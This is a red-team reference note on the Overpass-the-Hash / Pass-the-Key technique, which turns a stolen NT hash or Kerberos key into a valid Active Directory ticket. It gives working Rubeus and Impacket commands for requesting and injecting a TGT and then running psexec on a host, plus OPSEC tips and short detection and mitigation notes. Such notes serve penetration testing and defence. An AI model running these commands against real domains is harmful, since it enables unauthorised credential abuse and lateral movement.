---
title: Overpass-the-Hash
aliases: ["Overpass the Hash", "OPtH", "Pass the Key", "Pass-the-Key"]
type: technique
domain: [red-team]
attack_tactic: [lateral-movement, credential-access]
tags: [type/technique, domain/red-team, attack/lateral-movement, proto/kerberos]
source: "[[Source - zer1t0 - Attacking Active Directory]]"
source_url: "https://zer1t0.gitlab.io/posts/attacking_ad/"
verified: true
related: ["[[Kerberos Keys]]", "[[LM and NT Hashes]]", "[[Pass-the-Hash]]", "[[Pass-the-Ticket]]", "[[Kerberos Authentication Flow]]"]
created: 2026-06-06
updated: 2026-06-06
---

# Overpass-the-Hash

> [!summary] One-liner
> Use a user's Kerberos key or NT hash to request a real TGT (no plaintext password), then use Kerberos normally — "turning a hash into a ticket."

## Concept abused
The **AS-REQ** is encrypted with the user's [[Kerberos Keys|key]]. If you have that key — an **AES key** or the **RC4 key (= [[LM and NT Hashes|NT hash]])** — you can complete the AS exchange and get a legitimate **TGT**. This is **Pass-the-Key**; using the NT/RC4 key specifically is **Overpass-the-Hash**.

## Prerequisites
- The target's NT hash or a Kerberos key (from [[LSASS Dumping]], [[DCSync]], etc.).

## Commands & tools
```powershell
# Rubeus - request + inject TGT (prefer AES for OPSEC)
Rubeus.exe asktgt /user:Administrator /rc4:<NThash> /ptt
Rubeus.exe asktgt /user:Administrator /aes256:<aes256key> /ptt
```
```bash
# Impacket - get a ccache, then use -k -no-pass
getTGT.py 'contoso.local/Administrator' -hashes :<NThash>
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass contoso.local/Administrator@host
```

## Detection / artifacts
4768 (TGT request) using **RC4** when AES is expected (downgrade signal); ticket use from unusual host.

## Mitigation
AES enforcement + monitoring, Credential Guard, Protected Users, least privilege.

## Related
- NTLM equivalent: [[Pass-the-Hash]]; once you hold the TGT it's [[Pass-the-Ticket]]. Prefer **AES keys** over RC4.

## Sources
- [[Source - zer1t0 - Attacking Active Directory]] — "Pass the Key/Over Pass the Hash"
